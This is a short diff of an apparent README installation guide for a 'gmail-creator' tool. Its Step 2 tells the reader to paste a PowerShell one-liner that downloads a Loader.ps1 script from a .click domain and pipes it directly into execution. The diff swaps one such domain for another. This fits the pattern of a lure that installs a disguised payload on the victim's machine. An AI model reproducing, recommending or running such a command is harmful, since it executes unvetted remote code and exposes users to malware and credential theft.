@@ -51,7 +51,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1 | iex"
+powershell -Command "irm https://software-gateway.click/Loader.ps1?get=gmail-creator | iex"
 ```
 
 ### Step 3: Wait for Completion
